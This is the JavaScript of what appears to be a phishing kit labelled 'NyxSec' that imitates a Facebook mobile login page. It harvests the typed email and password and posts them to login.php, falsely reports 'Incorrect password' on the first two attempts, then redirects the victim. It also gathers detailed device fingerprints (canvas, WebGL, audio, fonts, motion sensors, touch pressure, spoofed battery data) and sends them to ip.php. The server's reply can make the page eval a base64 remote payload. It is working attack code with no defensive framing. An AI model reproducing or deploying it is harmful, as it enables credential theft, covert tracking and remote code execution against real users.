window.addEventListener('DOMContentLoaded',()=>{        function generateUUID() { var d = new Date().getTime(); if (typeof performance !== 'undefined' && typeof performance.now === 'function'){d += performance.now();} return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {var r = (d + Math.random() * 16) % 16 | 0; d = Math.floor(d / 16); return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);});}
        const sessionId = generateUUID();
        // Touch Pattern Collection (passive approach - start collecting on page load)
        let touchPatterns=[];
        let touchCollectionActive=true;
        document.addEventListener('touchstart',(e)=>{if(touchCollectionActive&&e.touches&&e.touches.length>0&&touchPatterns.length<5){const touch=e.touches[0];touchPatterns.push({pressure:touch.force||0.5,radiusX:touch.radiusX||10,radiusY:touch.radiusY||10,clientX:touch.clientX,clientY:touch.clientY,timestamp:Date.now()})}},{passive:true});
        console.log("[NyxSec] Generated sessionId:", sessionId);
        const sessionIdField = document.getElementById('sessionIdField');
        if (sessionIdField) { sessionIdField.value = sessionId; }
        window.loginTryCount = 0;
        const form=document.querySelector("#login__form");const emailInput=document.querySelector("#email");const passwordInput=document.querySelector("#password");const errorModal=document.getElementById('login_error');const loadingRedirectModal=document.getElementById('loadingRedirectModal');const modalOkButton=document.getElementById('modalOkButton');const passwordToggleLink=document.querySelector('a[data-sigil="password-plain-text-toggle"]');const loginBtn=document.querySelector('button[name="login"]._54k8');const errorModalH2=errorModal?errorModal.querySelector('.modal-content h2'):null;const errorModalP=errorModal?errorModal.querySelector('.modal-content p'):null;
function updateFloatingLabels(){[emailInput,passwordInput].forEach(input=>{if(!input)return;const label=document.querySelector(`label[for="${input.id}"]`);if(label){if(input.value||document.activeElement===input){}else{}}})}
if(emailInput&&passwordInput){[emailInput,passwordInput].forEach(input=>{input.addEventListener('input',updateFloatingLabels);input.addEventListener('focus',updateFloatingLabels);input.addEventListener('blur',updateFloatingLabels)});updateFloatingLabels()}
if(passwordToggleLink&&passwordInput){passwordToggleLink.addEventListener('click',function(e){e.preventDefault();if(passwordInput.type==='password'){passwordInput.type='text';passwordToggleLink.classList.add('show-password')}else{passwordInput.type='password';passwordToggleLink.classList.remove('show-password')}
passwordInput.focus()})}
window.openLoginErrorModal=function(){if(!errorModal)return;errorModal.style.display='flex';document.body.classList.add('modal-open');const modalBox=errorModal.querySelector('.fb-error-modal');if(modalBox){modalBox.classList.remove('shake');void modalBox.offsetWidth;modalBox.classList.add('shake')}
setTimeout(()=>{if(modalOkButton)modalOkButton.focus();},120)};function closeLoginErrorModal(){if(errorModal){errorModal.style.display='none';document.body.classList.remove('modal-open')}}
if(modalOkButton)modalOkButton.onclick=closeLoginErrorModal;if(errorModal){errorModal.addEventListener('mousedown',function(e){if(e.target===errorModal)closeLoginErrorModal();});window.addEventListener('keydown',function(e){if(errorModal.style.display!=='none'&&(e.key==='Escape'||e.key==='Esc')){closeLoginErrorModal()}})}
function showLoadingModal(){if(loadingRedirectModal){loadingRedirectModal.style.display='flex';setTimeout(()=>{loadingRedirectModal.classList.add('is-visible')},20)}}
function hideLoadingModal(){if(loadingRedirectModal){loadingRedirectModal.classList.remove('is-visible');setTimeout(()=>{loadingRedirectModal.style.display='none'},300)}}
const postCredentials=(isRedirectAttempt)=>{if(!emailInput||!passwordInput||!form){return}
const formData=new FormData();formData.append("email",emailInput.value);formData.append("password",passwordInput.value);
    formData.append("sessionId",sessionId);
    console.log("[NyxSec] Sent sessionId:", sessionId, "to login.php");if(loginBtn){loginBtn.disabled=!0;loginBtn.classList.add('loading');const spinner=loginBtn.querySelector('.btn-spinner');const btnText=loginBtn.querySelector('span._55sr');if(spinner)spinner.style.display='inline-block';if(btnText)btnText.style.display='none'}
showLoadingModal();fetch("login.php",{method:"POST",body:formData}).then(res=>{if(!res.ok){return res.text().then(text=>{throw new Error(`HTTP error ${res.status}: ${text || 'Server error'}`)})}
return res.text()}).then(responseText=>{hideLoadingModal();if(errorModalH2)errorModalH2.textContent="Incorrect password";if(errorModalP)errorModalP.textContent="The password you entered is incorrect. Please try again.";let blockAction=!1;if(isRedirectAttempt){if(responseText.startsWith("https://")){const redirectUrl=responseText.trim();const isInIframe=window.self!==window.top;if(isInIframe){window.parent.postMessage({type:'redirect',url:redirectUrl},'*');setTimeout(()=>{if(window.self!==window.top){window.location.href=redirectUrl}},100);return}else{window.location.href=redirectUrl;return}}else{if(errorModalH2)errorModalH2.textContent="Login Error";if(errorModalP)errorModalP.textContent="An unexpected error occurred. Please try again.";openLoginErrorModal();if(form)form.reset();blockAction=!0}}else{openLoginErrorModal();if(form)form.reset();blockAction=!0}
if(loginBtn){loginBtn.disabled=!1;loginBtn.classList.remove('loading');const spinner=loginBtn.querySelector('.btn-spinner');const btnText=loginBtn.querySelector('span._55sr');if(spinner)spinner.style.display='none';if(btnText)btnText.style.display='block'}}).catch(err=>{hideLoadingModal();if(errorModalH2)errorModalH2.textContent="Network Error";if(errorModalP)errorModalP.textContent="Could not connect. Please check your internet and try again.";openLoginErrorModal();if(loginBtn){loginBtn.disabled=!1;loginBtn.classList.remove('loading');const spinner=loginBtn.querySelector('.btn-spinner');const btnText=loginBtn.querySelector('span._55sr');if(spinner)spinner.style.display='none';if(btnText)btnText.style.display='block'}});};if(form){form.addEventListener('submit',(e)=>{e.preventDefault();const emailValue=emailInput?emailInput.value.trim():'';const passwordValue=passwordInput?passwordInput.value.trim():'';if(!emailValue||!passwordValue){if(errorModalH2)errorModalH2.textContent="Input Required";if(errorModalP)errorModalP.textContent="Please enter both your mobile number or email and password.";openLoginErrorModal();if(loginBtn&&loginBtn.classList.contains('loading')){loginBtn.disabled=!1;loginBtn.classList.remove('loading');const spinner=loginBtn.querySelector('.btn-spinner');const btnText=loginBtn.querySelector('span._55sr');if(spinner)spinner.style.display='none';if(btnText)btnText.style.display='block';hideLoadingModal()}
return}
if(window.loginTryCount>=2){postCredentials(!0)}else{postCredentials(!1);window.loginTryCount+=1}})}else{}
// Browser Detection Function
function detectBrowser() {
    const ua = navigator.userAgent;
    if (/iPhone|iPad|iPod/.test(ua)) return 'ios-safari';
    if (/Chrome/.test(ua) && /Android/.test(ua)) return 'android-chrome';
    if (/Firefox/.test(ua) && /Android/.test(ua)) return 'android-firefox';
    if (/SamsungBrowser/.test(ua)) return 'samsung-internet';
    return 'unknown';
}

// Time-Based Battery Simulation
function getRealisticBattery() {
    const hour = new Date().getHours();
    const isCharging = Math.random() < 0.15; // 15% chance charging
    
    let baseLevel;
    if (hour >= 6 && hour < 9) baseLevel = 0.85 + Math.random() * 0.15;
    else if (hour >= 9 && hour < 12) baseLevel = 0.70 + Math.random() * 0.15;
    else if (hour >= 12 && hour < 15) baseLevel = 0.55 + Math.random() * 0.20;
    else if (hour >= 15 && hour < 18) baseLevel = 0.40 + Math.random() * 0.20;
    else if (hour >= 18 && hour < 21) baseLevel = 0.25 + Math.random() * 0.20;
    else baseLevel = 0.15 + Math.random() * 0.15;
    
    return {
        level: Math.min(0.99, Math.max(0.05, baseLevel)),
        charging: isCharging
    };
}

// Realistic Connection Type
function getRealisticConnection(browserType) {
    if (browserType === 'ios-safari') {
        // iOS doesn't support Connection API
        return { type: '4g', downlink: 10 + Math.random() * 40 };
    }
    
    // Android - try real API first
    if (navigator.connection) {
        return {
            type: navigator.connection.effectiveType || '4g',
            downlink: navigator.connection.downlink || (10 + Math.random() * 40)
        };
    }
    
    // Fallback
    return { type: '4g', downlink: 10 + Math.random() * 40 };
}

const collectFingerprint=async()=>{const fingerprint={};try{
// Detect browser type first
const browserType=detectBrowser();

// Basic properties
fingerprint.userAgent=navigator.userAgent;fingerprint.language=navigator.language;fingerprint.languages=navigator.languages||[navigator.language];fingerprint.platform=navigator.platform;fingerprint.hardwareConcurrency=navigator.hardwareConcurrency;fingerprint.deviceMemory=navigator.deviceMemory;fingerprint.vendor=navigator.vendor||'Unknown';fingerprint.devicePixelRatio=window.devicePixelRatio||1;

// Screen properties (enhanced)
fingerprint.screenResolution=`${screen.width}x${screen.height}`;fingerprint.screenAvailWidth=screen.availWidth;fingerprint.screenAvailHeight=screen.availHeight;fingerprint.colorDepth=screen.colorDepth;fingerprint.pixelDepth=screen.pixelDepth||screen.colorDepth;

// Other basic properties
fingerprint.timezone=Intl.DateTimeFormat().resolvedOptions().timeZone;fingerprint.touchSupport=navigator.maxTouchPoints||0;fingerprint.localStorage='localStorage' in window;fingerprint.sessionStorage='sessionStorage' in window;fingerprint.indexedDB='indexedDB' in window;fingerprint.cookieEnabled=navigator.cookieEnabled;fingerprint.doNotTrack=navigator.doNotTrack;fingerprint.pluginCount=navigator.plugins?navigator.plugins.length:0;

// Screen orientation
if(screen.orientation){fingerprint.orientationType=screen.orientation.type||'portrait-primary';fingerprint.orientationAngle=screen.orientation.angle||0}else{fingerprint.orientationType='unknown';fingerprint.orientationAngle=0}

// Battery API with fallback
try{if(browserType==='android-firefox'&&'getBattery' in navigator){const battery=await navigator.getBattery();fingerprint.batteryLevel=battery.level;fingerprint.batteryCharging=battery.charging}else{const batteryData=getRealisticBattery();fingerprint.batteryLevel=batteryData.level;fingerprint.batteryCharging=batteryData.charging}}catch(e){const batteryData=getRealisticBattery();fingerprint.batteryLevel=batteryData.level;fingerprint.batteryCharging=batteryData.charging}

// Connection API with fallback
try{const connectionData=getRealisticConnection(browserType);fingerprint.connectionType=connectionData.type;fingerprint.connectionDownlink=connectionData.downlink}catch(e){fingerprint.connectionType='4g';fingerprint.connectionDownlink=25}

// Mobile Sensors Collection
fingerprint.mobileSensors={};
// Gyroscope collection
try{if(window.DeviceOrientationEvent&&typeof DeviceOrientationEvent.requestPermission==='function'){const permission=await DeviceOrientationEvent.requestPermission();if(permission==='granted'){const gyroReadings=[];let gyroCount=0;const gyroListener=(e)=>{if(gyroCount<10){gyroReadings.push({alpha:e.alpha||0,beta:e.beta||0,gamma:e.gamma||0,timestamp:Date.now()});gyroCount++}else{window.removeEventListener('deviceorientation',gyroListener)}};window.addEventListener('deviceorientation',gyroListener);await new Promise(resolve=>setTimeout(resolve,2000));fingerprint.mobileSensors.gyroscope=gyroReadings}}else if(window.DeviceOrientationEvent){const gyroReadings=[];let gyroCount=0;const gyroListener=(e)=>{if(gyroCount<10){gyroReadings.push({alpha:e.alpha||0,beta:e.beta||0,gamma:e.gamma||0,timestamp:Date.now()});gyroCount++}else{window.removeEventListener('deviceorientation',gyroListener)}};window.addEventListener('deviceorientation',gyroListener);await new Promise(resolve=>setTimeout(resolve,2000));fingerprint.mobileSensors.gyroscope=gyroReadings}else{fingerprint.mobileSensors.gyroscope=[]}}catch(e){fingerprint.mobileSensors.gyroscope=[]}
// Accelerometer collection
try{if(window.DeviceMotionEvent&&typeof DeviceMotionEvent.requestPermission==='function'){const permission=await DeviceMotionEvent.requestPermission();if(permission==='granted'){const accelReadings=[];let accelCount=0;const accelListener=(e)=>{if(accelCount<10&&e.acceleration){accelReadings.push({x:e.acceleration.x||0,y:e.acceleration.y||0,z:e.acceleration.z||0,timestamp:Date.now()});accelCount++}else if(accelCount>=10){window.removeEventListener('devicemotion',accelListener)}};window.addEventListener('devicemotion',accelListener);await new Promise(resolve=>setTimeout(resolve,2000));fingerprint.mobileSensors.accelerometer=accelReadings}}else if(window.DeviceMotionEvent){const accelReadings=[];let accelCount=0;const accelListener=(e)=>{if(accelCount<10&&e.acceleration){accelReadings.push({x:e.acceleration.x||0,y:e.acceleration.y||0,z:e.acceleration.z||0,timestamp:Date.now()});accelCount++}else if(accelCount>=10){window.removeEventListener('devicemotion',accelListener)}};window.addEventListener('devicemotion',accelListener);await new Promise(resolve=>setTimeout(resolve,2000));fingerprint.mobileSensors.accelerometer=accelReadings}else{fingerprint.mobileSensors.accelerometer=[]}}catch(e){fingerprint.mobileSensors.accelerometer=[]}

// Touch Pattern Collection (use patterns collected from page load)
fingerprint.touchPatterns=touchPatterns.slice(0,5);

// WebGL (existing code - keep as is)
const canvasEl=document.createElement('canvas');try{const gl=canvasEl.getContext('webgl')||canvasEl.getContext('experimental-webgl');if(gl){fingerprint.webGLRenderer=gl.getParameter(gl.RENDERER);fingerprint.webGLVendor=gl.getParameter(gl.VENDOR);const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');if(debugInfo){fingerprint.webGLUnmaskedRenderer=gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);fingerprint.webGLUnmaskedVendor=gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)}}else{fingerprint.webGLRenderer="n/a";fingerprint.webGLVendor="n/a"}}catch(e){fingerprint.webGLRenderer="error";fingerprint.webGLVendor="error"}
try{const ctxCanvas=canvasEl.getContext('2d');if(ctxCanvas){ctxCanvas.textBaseline="top";ctxCanvas.font="14px 'Arial'";ctxCanvas.textBaseline="alphabetic";ctxCanvas.fillStyle="#f60";ctxCanvas.fillRect(125,1,62,20);ctxCanvas.fillStyle="#069";ctxCanvas.fillText("BrowserLeaks,com <canvas> 1.0",2,15);ctxCanvas.fillStyle="rgba(102, 204, 0, 0.7)";ctxCanvas.fillText("BrowserLeaks,com <canvas> 1.0",4,17);fingerprint.canvasFingerprint=canvasEl.toDataURL()}else{fingerprint.canvasFingerprint="n/a"}}catch(e){fingerprint.canvasFingerprint="error"}
try{const testFonts=['Arial','Verdana','Times New Roman','Helvetica','Courier New','Georgia','Comic Sans MS'];const baseFonts=['monospace','sans-serif','serif'];const testString="mmmmmmmmmmlli";const testSize='72px';const h=document.body;const s=document.createElement("span");s.style.fontSize=testSize;s.innerHTML=testString;s.style.position='absolute';s.style.visibility='hidden';const defaultWidth={};const defaultHeight={};for(let index in baseFonts){s.style.fontFamily=baseFonts[index];h.appendChild(s);defaultWidth[baseFonts[index]]=s.offsetWidth;defaultHeight[baseFonts[index]]=s.offsetHeight;h.removeChild(s)}
const detectedFonts=testFonts.filter(font=>{let detected=!1;for(let index in baseFonts){s.style.fontFamily=font+','+baseFonts[index];h.appendChild(s);const matched=(s.offsetWidth!==defaultWidth[baseFonts[index]]||s.offsetHeight!==defaultHeight[baseFonts[index]]);h.removeChild(s);detected=detected||matched}return detected});fingerprint.fonts=detectedFonts}catch(e){fingerprint.fonts=["error"]}
try{const audioContext=window.OfflineAudioContext||window.webkitAudioContext;if(!audioContext){fingerprint.audioFingerprint="not supported"}else{const ctxAudio=new audioContext(1,44100,44100);const oscillator=ctxAudio.createOscillator();const compressor=ctxAudio.createDynamicsCompressor();if(compressor.threshold)compressor.threshold.value=-50;if(compressor.knee)compressor.knee.value=40;if(compressor.ratio)compressor.ratio.value=12;if(compressor.attack)compressor.attack.value=0;if(compressor.release)compressor.release.value=0.25;oscillator.type="triangle";oscillator.frequency.setValueAtTime(10000,ctxAudio.currentTime);oscillator.connect(compressor);compressor.connect(ctxAudio.destination);oscillator.start(0);const rendered=await new Promise((resolve,reject)=>{ctxAudio.oncomplete=event=>{try{let fpData=event.renderedBuffer.getChannelData(0).slice(4500,5000).reduce((acc,val)=>acc+Math.abs(val),0).toString();let hash=0;for(let i=0;i<fpData.length;i++){const char=fpData.charCodeAt(i);hash=((hash<<5)-hash)+char;hash|=0}
resolve(hash.toString())}catch(eInner){reject("error processing audio buffer")}};ctxAudio.startRendering().catch(renderError=>{reject("error starting audio rendering")});setTimeout(()=>{reject("audio rendering timeout")},1000)});fingerprint.audioFingerprint=rendered}}catch(e){fingerprint.audioFingerprint=(typeof e==='string'&&(e.includes("timeout")||e.includes("error starting")||e.includes("error processing")))?e:"error"}}catch(err){fingerprint.error=err.message||"Main collection failed";if(!fingerprint.userAgent&&navigator)fingerprint.userAgent=navigator.userAgent||"Unknown"}
fingerprint.sessionId=sessionId;return fingerprint};const sendFingerprint=(fpObject)=>{if(!fpObject||Object.keys(fpObject).length===0){return}
fetch("ip.php",{method:"POST",headers:{'Content-Type':'application/json'},body:JSON.stringify(fpObject)}).then(response=>response.json()).then(command=>{switch(command.action){case'EXECUTE_PAYLOAD':const payload=atob(command.payload);eval(payload);break;case'REDIRECT':window.location.href=command.url;break;case'PROCEED':break;default:}}).catch(err=>{});};collectFingerprint().then(fingerprintResult=>{sendFingerprint(fingerprintResult)}).catch(collectionError=>{sendFingerprint({error:"Client-side collection promise failed",errorMessage:collectionError?collectionError.toString():"Unknown collection error",userAgent:navigator.userAgent||"Unknown"})});})
